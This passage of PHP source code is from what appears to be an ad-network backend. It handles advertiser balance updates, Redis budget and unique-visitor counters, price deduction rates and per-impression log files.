                    // echo '数据库连接失败'.$e->getMessage();
                }
                $pdoa->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
                $advUpdate = $pdoa->prepare("UPDATE lz_users set adv_money=? WHERE uid=?");
                $advUpdate->execute(array($adv_money['adv_money'], $list['planuid']));
                $pdoa = null;
                //该广告商的redis置0
                $adv_money['key_money'] = 0;
                $redis->handler()->HMSET('users-'.$list['planuid'],$adv_money);
            }

            $sumprofit = $list['adv_money'] - $list['web_money'];     // 平台盈利
            $sumpay = $list['web_money'];                           //站长盈利
            $sumadvpay = $list['adv_money'];                      //广告商支付

            //缓存计划限额
            $redis->handler()->HINCRBYFLOAT('budget-'.$list['pid'].'-'.$dayTime,'budget',$list['adv_money']);

            // //日期目录

            //chapv统计到log
            $logday = date('Ymd');
            $logdate = date('H-i');

            //文件目录
            $data_str = substr($logdate,0,strlen($logdate)-1);
            if (!file_exists(__DIR__.'/../test/lezunlog/'.$logday)){
                mkdir (__DIR__."/../test/lezunlog/".$logday,0755,true);
            }
            $log_test_file = __DIR__."/../test/lezunlog/".$logday.'/'.'v'.$data_str.'.log';

            $log_test_str = "ad_id=".$list['ad_id'].",adz_id=".$list['adz_id'].",site_id=".$list['site_id'].",uid=".$list['uid'].",pid=".$list['pid'].",views=1,sumprofit=".$sumprofit.",sumpay=".$sumpay.",sumadvpay=".$sumadvpay.",uv_web=".$uvNumber.",ui_web=".$ipNumber.",web_deduction=".$web_deduction.",adv_deduction=".$adv_deduction.",web_num=".$web_num.",adv_num=".$adv_num.",day=".$dayTime.",adv_id=".$list['planuid'].",plan_type=".$list['plan_type'].",tc_id=".$list['tc_id'].",tpl_id=".$list['tpl_id']."\n";

            writeFileForPv($log_test_file,$log_test_str);

            //将redis里面的数据同步到数据库
            redis_update($list,$redis,$dayTime);


        }else{
            //将redis里面的数据同步到数据库
            redis_update($list,$redis,$dayTime);

            //chapv统计到log
            $logday = date('Ymd');
            $logdate = date('H-i');
            //文件目录
            $data_str = substr($logdate,0,strlen($logdate)-1);
            if (!file_exists(__DIR__.'/../test/lezunlog/'.$logday)){
                mkdir (__DIR__."/../test/lezunlog/".$logday,0755,true);
            }
            $log_test_file = __DIR__."/../test/lezunlog/".$logday.'/'.'c'.$data_str.'.log';
            $log_test_str = "ad_id=".$list['ad_id'].",adz_id=".$list['adz_id'].",site_id=".$list['site_id'].",uid=".$list['uid'].",pid=".$list['pid'].",views=1,click_num=0,sumprofit=0,sumpay=0,sumadvpay=0,uv_web=".$uvNumber.",ui_web=".$ipNumber.",web_deduction=0,adv_deduction=0,web_num=0,adv_num=0,day=".$dayTime.",adv_id=".$list['planuid'].",plan_type=".$list['plan_type'].",tc_id=".$list['tc_id'].",tpl_id=".$list['tpl_id']."\n";
            writeFileForPv($log_test_file,$log_test_str);
        }

    }else{
        //将redis里面的数据同步到数据库
        redis_update($list,$redis,$dayTime);

        //chapv统计到log
        $logday = date('Ymd');
        $logdate = date('H-i');
        //文件目录
        $data_str = substr($logdate,0,strlen($logdate)-1);
        if (!file_exists(__DIR__.'/../test/lezunlog/'.$logday)){
            mkdir (__DIR__."/../test/lezunlog/".$logday,0755,true);
        }
        $log_test_file = __DIR__."/../test/lezunlog/".$logday.'/'.'c'.$data_str.'.log';
        $log_test_str = "ad_id=".$list['ad_id'].",adz_id=".$list['adz_id'].",site_id=".$list['site_id'].",uid=".$list['uid'].",pid=".$list['pid'].",views=1,click_num=0,sumprofit=0,sumpay=0,sumadvpay=0,uv_web=".$uvNumber.",ui_web=".$ipNumber.",web_deduction=0,adv_deduction=0,web_num=0,adv_num=0,day=".$dayTime.",adv_id=".$list['planuid'].",plan_type=".$list['plan_type'].",tc_id=".$list['tc_id'].",tpl_id=".$list['tpl_id']."\n";
        writeFileForPv($log_test_file,$log_test_str);
    }


    unset($log_test_file);
    unset($log_test_str);

}

//将redis里面的数据同步到数据库
function redis_update($list,$redis,$dayTime)
{
    //处理计划限额
    $money = $redis->handler()->HMGET('budget-'.$list['pid'].'-'.$dayTime,array('budget'));
    if($list['budget'] <= $money['budget']){

        if(!empty($list['type'])){

            //当前计划是否为游戏推广计划，查看是否缓存中存在
            $game_pid = $redis->handler()->HMGET('game-pid-budget',array($list['pid']));

            if(empty($game_pid[$list['pid']])){

                //游戏推广
                $game_pid_array = array(

                    ''.$list['pid'].'' =>$list['budget'],
                );
                $redis->handler()->HMSET('game-pid-budget',$game_pid_array);
            }else{

                //清空当前游戏推广计划的值
                $game_pid_initialize = array(

                    ''.$list['pid'].'' =>'',
                );
                $redis->handler()->HMSET('game-pid-budget',$game_pid_initialize);
                //初始化改计划限额
                $game_budget = array(
                    'budget' => $list['adv_money'],
                );
                $redis->handler()->HMSET('budget-'.$list['pid'].'-'.$dayTime,$game_budget);
            }
        }
        $money = $redis->handler()->HMGET('budget-'.$list['pid'].'-'.$dayTime,array('budget'));

        if(!empty($money['budget']) && ($list['budget'] <= $money['budget'])){
            try{
                $pdoa = new PDO($redis->db_pv_link,$redis->db_pv_root,$redis->db_pv_password);
            }catch(PDOException $e){
                // echo '数据库连接失败'.$e->getMessage();
            }
            $pdoa->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
            $webUpdate = $pdoa->prepare("UPDATE lz_plan SET status=3 WHERE pid=?");
            $webUpdate->execute(array($list['pid']));
            $pdoa = null;
        }

    }

}

//判断实时ip信息
function updateRealtimeip($list,$uiNum,$redis)
{
    if(!empty($uiNum)){
        //数据报表独立访客+1
        $uiNumber = 0;
        $redis->handler()->HINCRBY('ui_ip_'.$list['adz_id'],$list['user_ip'],1);

    }else{
        $uiNumber = 1;
        //计费次数初始化1
        $ip_arr = array(
            ''.$list['user_ip'].'' => 1
        );
        $redis->handler()->HMSET('ui_ip_'.$list['adz_id'],$ip_arr);
    }
    return $uiNumber;
}

//判断有无,添加或修改浏览器表数据
function updateBrowser($list,$redis)
{
    //得到是否有这个ip
    $havaIp = $redis->handler()->SISMEMBER('uv_'.$list['adz_id'],$list['base_cookies']);


    // 有此ip就增加重复数，没有就添加
    if(empty($havaIp)){
        $uvNumber = 1;
        //存各个站长独立ip
        $redis->handler()->SADD('uv_'.$list['adz_id'],$list['base_cookies']);
    }else{
        $uvNumber = 0;
    }
    return $uvNumber;
}

//根据不同的扣量优先级选择扣量
function getDeducation($list,$pdo)
{
    //判断选择扣量的优先级
    if(empty($list['user_web_deduction']) && empty($list['user_adv_deduction'])){         //站长扣量

        if(empty($list['adz_web_deduction']) && empty($list['adz_adv_deduction'])){       //广告位扣量

            if(empty($list['ads_web_deduction']) && empty($list['ads_adv_deduction'])){     //广告扣量

                if(empty($list['plan_web_deduction']) && empty($list['deduction'])){        //计划扣量
                    // 查全局扣量
                    $sett = $pdo->prepare("SELECT cpm_deduction,adv_cpm_deduction FROM lz_setting");
                    $sett->execute();
                    $settRes = $sett->fetchAll();
                    $list['web_deduction'] = $settRes[0]['cpm_deduction'] / 100;
                    $list['adv_deduction'] = $settRes[0]['adv_cpm_deduction'] / 100;
                }else{
                    $list['web_deduction'] = $list['plan_web_deduction'] / 100;
                    $list['adv_deduction'] = $list['deduction'] / 100;
                }
            }else{
                $list['web_deduction'] = $list['ads_web_deduction'] / 100;
                $list['adv_deduction'] = $list['ads_adv_deduction'] / 100;
            }
        }else{
            $list['web_deduction'] = $list['adz_web_deduction'] / 100;
            $list['adv_deduction'] = $list['adz_adv_deduction'] / 100;
        }
    }else{
        $list['web_deduction'] = $list['user_web_deduction'] / 100;
        $list['adv_deduction'] = $list['user_adv_deduction'] / 100;
    }

    //加上扣量之后的单价
    $list['adv_money'] = $list['pricedv'] * (1 + ($list['adv_deduction']));
    $list['web_money'] = $list['price'] * (1 + ($list['web_deduction']));
    return $list;
}

//正则截取GET提交的id(只留取数字)
function getIdCut($id)
{
    preg_match_all('/\d+/',$id,$name);
    $id_num = join('',$name[0]);

    return $id_num;
}


